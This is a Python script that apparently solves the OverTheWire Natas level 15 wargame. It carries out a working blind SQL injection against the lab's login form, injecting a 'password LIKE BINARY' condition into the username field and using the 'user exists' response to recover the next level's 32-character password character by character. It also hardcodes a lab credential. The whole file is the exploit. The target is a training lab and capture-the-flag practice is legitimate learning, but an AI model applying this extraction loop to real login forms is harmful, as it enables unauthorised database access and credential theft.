import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

character_set = string.ascii_letters + string.digits

flag_dictionary = ''

exist_string = 'This user exists.'

# building possible character dictionary for the password
for char in character_set:
    data = {'username' : 'natas16" AND password LIKE BINARY "%' + char + '%"#'}
    response = requests.post(url, auth=(username, password), data=data)

    if exist_string in response.text:
        flag_dictionary += char
        print(f'Flag dictionary: {flag_dictionary}')

print(f'Complete dictionary: {flag_dictionary}')

print('\nBrute forcing...')

# since flag length is 32, try every 32-character strings based on the flag dictionary
correct_flag = ''

for i in range(32):
    for char in flag_dictionary:
        data = {'username' : 'natas16" AND password LIKE BINARY "' + correct_flag + char + '%"#'}
        response = requests.post(url, auth=(username, password), data=data)

        if exist_string in response.text:
            correct_flag += char
            print(f'Building flag: {correct_flag}')
            break

print(f'Correct flag: {correct_flag}')
